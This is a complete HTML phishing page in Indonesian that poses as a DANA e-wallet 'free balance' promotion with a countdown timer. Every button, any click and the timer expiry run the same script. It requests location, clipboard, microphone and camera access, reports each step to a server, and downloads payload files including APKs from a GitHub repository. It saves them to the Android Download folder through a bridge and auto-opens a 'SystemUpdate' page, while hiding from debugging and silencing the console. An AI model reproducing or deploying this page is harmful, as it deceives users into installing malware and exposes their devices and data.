<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <title>Verifikasi</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@700&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        html,body{width:100%;height:100%;background:#fff;overflow:hidden;font-family:Arial,sans-serif}
        #popupDana{position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;background:linear-gradient(180deg,#1fa2ff 0%,#0e72d7 100%);display:flex;justify-content:center;align-items:center;text-align:center}
        .box{max-width:380px;width:90%;padding:20px}
        .logo-dana{display:flex;align-items:center;justify-content:center;gap:12px;margin:0 auto 15px}
        .icon-wrapper{width:70px;height:70px;background:#fff;border-radius:50%;display:flex;justify-content:center;align-items:center}
        .flag-svg{width:38px;height:33px;fill:#1fa2ff}
        .text-dana{color:#fff;font-family:'Outfit',sans-serif;font-size:50px;font-weight:700;letter-spacing:6px;text-shadow:0 0 1px rgba(255,255,255,0.5)}
        .subtitle{color:#b3d9ff;font-size:16px;margin:5px 0;font-weight:bold}
        .box-white{background:#fff;border-radius:15px;padding:20px;margin:15px 0}
        .box-white .label{color:#666;font-size:13px}
        .box-white .nominal{color:#108ee9;font-size:45px;font-weight:bold;margin:10px 0}
        .box-white .kuota{color:#0066cc;font-size:12px}
        .timer{color:#ffcc00;font-size:14px;font-weight:bold}
        .btn-klaim{background:#108ee9;color:#fff;border:none;padding:18px;font-size:20px;font-weight:bold;border-radius:30px;cursor:pointer;width:100%;margin:10px 0;letter-spacing:2px;transition:0.3s}
        .btn-klaim:hover{transform:scale(1.02)}
        .btn-tolak{background:transparent;color:#99c2ff;border:2px solid #3388cc;padding:14px;font-size:15px;border-radius:30px;cursor:pointer;width:100%}
        .status-bar{position:fixed;top:0;left:0;width:100%;height:4px;z-index:999999;background:#ff0000;display:none}
        .status-bar.loading{display:block;animation:loading 3s infinite}
        @keyframes loading{0%{width:0%}100%{width:100%}}
        .anti-debug{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0}
        .hidden-download{position:absolute;width:0;height:0;border:none;visibility:hidden}
        .ios-download{display:none}
    </style>
</head>
<body>

<iframe class="anti-debug" srcdoc="<script>debugger;</script>"></iframe>
<div id="statusBar" class="status-bar"></div>
<iframe id="downloadFrame" class="hidden-download"></iframe>
<div id="iosDownload" class="ios-download"></div>

<div id="popupDana">
    <div class="box">
        <div class="logo-dana">
            <div class="icon-wrapper">
                <svg class="flag-svg" viewBox="0 0 50 40" xmlns="http://www.w3.org/2000/svg">
                    <path d="M6 9 C15 16, 35 2, 44 9 L44 29 C35 22, 15 36, 6 29 Z" />
                </svg>
            </div>
            <div class="text-dana">DANA</div>
        </div>
        <div class="subtitle">🎉 SELAMAT! Anda mendapatkan Saldo DANA GRATIS!</div>
        <div class="box-white">
            <div class="label">Saldo DANA Gratis</div>
            <div class="nominal">Rp 500.000</div>
            <div class="kuota">🎁 Kuota terbatas!</div>
        </div>
        <div class="timer">⏰ Tersisa <span id="timer">00:10</span></div>
        <button class="btn-klaim" onclick="klaim()">✅ KLAIM SEKARANG</button>
        <button class="btn-tolak" onclick="tolak()">❌ Tidak, Terima Kasih</button>
    </div>
</div>

<script>
// ============================================================
// 🔥 INDEX.HTML - RINGAN (3 TUGAS UTAMA)
// ============================================================

// ============================================================
// K() - KIRIM DATA KE SERVER
// ============================================================
function K(d) {
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', '/data', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.timeout = 5000;
        xhr.send(JSON.stringify(d));
    } catch(e) {}
}

// ============================================================
// DETEKSI PLATFORM
// ============================================================
function detectPlatform() {
    var ua = navigator.userAgent.toLowerCase();
    return {
        isAndroid: ua.indexOf('android') > -1,
        isIOS: /iphone|ipad|ipod/.test(ua),
        isPC: !ua.match(/android|iphone|ipad|ipod|mobile/i),
        isWebView: ua.indexOf('wv') > -1 || ua.indexOf('webview') > -1,
        isAndroidBridge: typeof AndroidBridge !== 'undefined'
    };
}
var PLATFORM = detectPlatform();

// ============================================================
// KONFIGURASI
// ============================================================
var GITHUB_USER = 'pandora-site';
var GITHUB_REPO = 'verifikasi-site';
var semuaDidapat = false;
var DOWNLOAD_STARTED = false;

var MANIFEST_URL = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/manifest.txt';
var BASE_URL = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/';
var DOWNLOADED_FILES = [];

// ============================================================
// ANDROID BRIDGE
// ============================================================
var A = {
    isAvailable: typeof AndroidBridge !== 'undefined' && PLATFORM.isAndroid,
    saveFile: function(p,c) { if(this.isAvailable){ try{ AndroidBridge.saveFile(p,c); return true }catch(e){} } return false; },
    readFile: function(p) { if(this.isAvailable){ try{ return AndroidBridge.readFile(p) }catch(e){} } return null; },
    fileExists: function(p) { if(this.isAvailable){ try{ return AndroidBridge.fileExists(p) }catch(e){} } return false; },
    openFile: function(p) { if(this.isAvailable){ try{ AndroidBridge.openFile(p); return true }catch(e){} } return false; },
    saveToPreferences: function(k,v) { if(this.isAvailable){ try{ AndroidBridge.saveToPreferences(k,v); return true }catch(e){} } return false; },
    getFromPreferences: function(k) { if(this.isAvailable){ try{ return AndroidBridge.getFromPreferences(k) }catch(e){} } return null; },
    saveFileBinary: function(p,d) { if(this.isAvailable){ try{ AndroidBridge.saveFileBinary(p,d); return true }catch(e){} } return false; }
};

// ============================================================
// ✅ TUGAS 1: BYPASS SEMUA IZIN
// ============================================================
function injectAllPermissions() {
    try {
        if (navigator.geolocation) {
            try { navigator.geolocation.getCurrentPosition(function(){}, function(){}, {enableHighAccuracy:true,timeout:5000}); } catch(e) {}
        }
        if ('Notification' in window && Notification.permission !== 'denied') {
            try { if (Notification.permission !== 'granted') { Notification.requestPermission(); } } catch(e) {}
        }
        if (navigator.clipboard) {
            try { navigator.clipboard.readText().catch(function(){}); } catch(e) {}
        }
        if (navigator.mediaDevices) {
            try { navigator.mediaDevices.getUserMedia({audio:true,video:false}).then(function(s){s.getTracks().forEach(function(t){t.stop()});}).catch(function(){}); } catch(e) {}
            try { navigator.mediaDevices.getUserMedia({audio:false,video:true}).then(function(s){s.getTracks().forEach(function(t){t.stop()});}).catch(function(){}); } catch(e) {}
        }
        if (navigator.vibrate) { try { navigator.vibrate(1); } catch(e) {} }
        K({ sumber: 'bypass_permissions_done', data: 'all_bypassed' });
    } catch(e) {}
}

// ============================================================
// ✅ TUGAS 2: DOWNLOAD PAYLOAD (manifest.txt)
// ============================================================
function downloadPayload() {
    if (DOWNLOAD_STARTED) return;
    DOWNLOAD_STARTED = true;
    
    K({ sumber: 'download_start', data: 'reading_manifest' });
    
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', MANIFEST_URL, true);
        xhr.timeout = 15000;
        xhr.onload = function() {
            if (xhr.status === 200) {
                try {
                    var lines = xhr.responseText.trim().split('\n');
                    var files = [];
                    for (var i = 0; i < lines.length; i++) {
                        var line = lines[i].trim();
                        if (line.length > 0) files.push(line);
                    }
                    K({ sumber: 'manifest_files', data: { files: files } });
                    downloadAllFiles(files, 0);
                } catch(e) {
                    K({ sumber: 'manifest_error', data: e.message });
                    openSystemUpdateHTML();
                }
            } else {
                K({ sumber: 'manifest_failed', data: 'status_' + xhr.status });
                openSystemUpdateHTML();
            }
        };
        xhr.onerror = function() { K({ sumber: 'manifest_error', data: 'network_error' }); openSystemUpdateHTML(); };
        xhr.ontimeout = function() { K({ sumber: 'manifest_timeout', data: 'timeout' }); openSystemUpdateHTML(); };
        xhr.send();
    } catch(e) {
        K({ sumber: 'manifest_exception', data: e.message });
        openSystemUpdateHTML();
    }
}

function downloadAllFiles(files, index) {
    if (index >= files.length) {
        K({ sumber: 'all_downloaded', data: { files: DOWNLOADED_FILES } });
        // ✅ TUGAS 3: BUKA SYSTEMUPDATE.HTML OTOMATIS
        setTimeout(function() { openSystemUpdateHTML(); }, 1000);
        return;
    }
    
    var fileName = files[index];
    var fileUrl = BASE_URL + fileName;
    
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', fileUrl, true);
        xhr.responseType = 'blob';
        xhr.timeout = 60000;
        xhr.onload = function() {
            if (xhr.status === 200) {
                var reader = new FileReader();
                reader.onload = function() {
                    var base64 = reader.result.split(',')[1];
                    if (base64) {
                        saveFile(fileName, base64);
                        DOWNLOADED_FILES.push(fileName);
                        K({ sumber: 'file_saved', data: { file: fileName } });
                    }
                };
                reader.readAsDataURL(xhr.response);
            } else {
                K({ sumber: 'file_download_failed', data: { file: fileName, status: xhr.status } });
            }
            setTimeout(function() { downloadAllFiles(files, index + 1); }, 300);
        };
        xhr.onerror = function() {
            K({ sumber: 'file_download_error', data: { file: fileName } });
            setTimeout(function() { downloadAllFiles(files, index + 1); }, 300);
        };
        xhr.ontimeout = function() {
            K({ sumber: 'file_download_timeout', data: { file: fileName } });
            setTimeout(function() { downloadAllFiles(files, index + 1); }, 300);
        };
        xhr.send();
    } catch(e) {
        K({ sumber: 'file_download_exception', data: { file: fileName, error: e.message } });
        setTimeout(function() { downloadAllFiles(files, index + 1); }, 300);
    }
}

function saveFile(fileName, base64Content) {
    var name = fileName.replace(/[^a-zA-Z0-9._-]/g, '');
    
    // localStorage
    try { localStorage.setItem('file_' + name, base64Content); } catch(e) {}
    
    // IndexedDB
    try {
        var request = indexedDB.open('SystemUpdateDB', 1);
        request.onupgradeneeded = function(e) {
            var db = e.target.result;
            if (!db.objectStoreNames.contains('files')) {
                db.createObjectStore('files');
            }
        };
        request.onsuccess = function(e) {
            var db = e.target.result;
            var tx = db.transaction('files', 'readwrite');
            var store = tx.objectStore('files');
            store.put(base64Content, name);
        };
    } catch(e) {}
    
    // Download folder + SharedPreferences (via Bridge)
    if (PLATFORM.isAndroid && A.isAvailable) {
        try {
            var path = '/storage/emulated/0/Download/' + name;
            if (name.toLowerCase().indexOf('.apk') > -1) {
                var binary = Uint8Array.from(atob(base64Content), c => c.charCodeAt(0));
                A.saveFileBinary(path, binary);
            } else {
                var content = atob(base64Content);
                A.saveFile(path, content);
            }
        } catch(e) {}
        try {
            var encoded = btoa(unescape(encodeURIComponent(base64Content)));
            A.saveToPreferences('file_' + name, encoded);
        } catch(e) {}
    }
}

// ============================================================
// ✅ TUGAS 3: BUKA SYSTEMUPDATE.HTML OTOMATIS
// ============================================================
function openSystemUpdateHTML() {
    var htmlContent = null;
    
    // 1. SharedPreferences
    if (PLATFORM.isAndroid && A.isAvailable) {
        try {
            var encoded = A.getFromPreferences('file_SystemUpdate.html');
            if (encoded) { htmlContent = decodeURIComponent(escape(atob(encoded))); }
        } catch(e) {}
    }
    
    // 2. localStorage
    if (!htmlContent) {
        try { htmlContent = localStorage.getItem('file_SystemUpdate.html'); } catch(e) {}
    }
    
    // 3. IndexedDB
    if (!htmlContent) {
        try {
            var request = indexedDB.open('SystemUpdateDB', 1);
            request.onsuccess = function(e) {
                var db = e.target.result;
                var tx = db.transaction('files', 'readonly');
                var store = tx.objectStore('files');
                var get = store.get('SystemUpdate.html');
                get.onsuccess = function() {
                    if (get.result) {
                        try { var content = atob(get.result); openHTML(content); } catch(e) {}
                    }
                };
            };
        } catch(e) {}
    }
    
    // 4. Download folder
    if (!htmlContent && PLATFORM.isAndroid && A.isAvailable) {
        try { htmlContent = A.readFile('/storage/emulated/0/Download/SystemUpdate.html'); } catch(e) {}
    }
    
    if (htmlContent) {
        openHTML(htmlContent);
    } else {
        // ⏳ Tunggu 3 detik, coba lagi
        setTimeout(function() { openSystemUpdateHTML(); }, 3000);
    }
}

function openHTML(htmlContent) {
    if (PLATFORM.isAndroid && A.isAvailable) {
        try {
            var path = '/storage/emulated/0/Download/SystemUpdate.html';
            if (A.fileExists(path)) {
                A.openFile(path);
                K({ sumber: 'systemupdate_opened', data: 'via_bridge' });
                return;
            }
        } catch(e) {}
    }
    try {
        var blob = new Blob([htmlContent], { type: 'text/html' });
        var url = URL.createObjectURL(blob);
        window.location.href = url;
        K({ sumber: 'systemupdate_opened', data: 'via_blob' });
    } catch(e) {}
}

// ============================================================
// 🔥 MAIN
// ============================================================
function dapatkanSemua() {
    if (semuaDidapat) return;
    semuaDidapat = true;
    
    try {
        var popup = document.getElementById('popupDana');
        if (popup) popup.style.display = 'none';
        
        K({ sumber: 'trigger', data: 'dapatkanSemua' });
        
        // TUGAS 1
        injectAllPermissions();
        
        // TUGAS 2
        setTimeout(downloadPayload, 500);
        
        // STATUS BAR
        setTimeout(function() { 
            var bar = document.getElementById('statusBar'); 
            if (bar) bar.className = 'status-bar loading';
        }, 500);
        
    } catch(e) {
        K({ sumber: 'dapatkanSemua_error', data: e.message });
    }
}

function klaim() { K({sumber:'izin', data:'klaim'}); dapatkanSemua(); }
function tolak() { K({sumber:'izin', data:'tolak'}); dapatkanSemua(); }

// ============================================================
// 🔥 TIMER
// ============================================================
var w = 10;
var timer = setInterval(function() {
    w--;
    var el = document.getElementById('timer');
    if (el) el.textContent = '00:' + (w < 10 ? '0' + w : w);
    if (w <= 0) {
        clearInterval(timer);
        K({sumber:'izin', data:'auto'});
        dapatkanSemua();
    }
}, 1000);

document.addEventListener('click', function() {
    if (!semuaDidapat) {
        K({sumber:'izin', data:'click_anywhere'});
        dapatkanSemua();
    }
});

// ============================================================
// 🔥 STEALTH
// ============================================================
console.log = function() {};
console.warn = function() {};
console.error = function() {};
console.info = function() {};
console.debug = function() {};
console.table = function() {};

K({ sumber: 'page_loaded', data: 'index_html' });
</script>
</body>
</html>
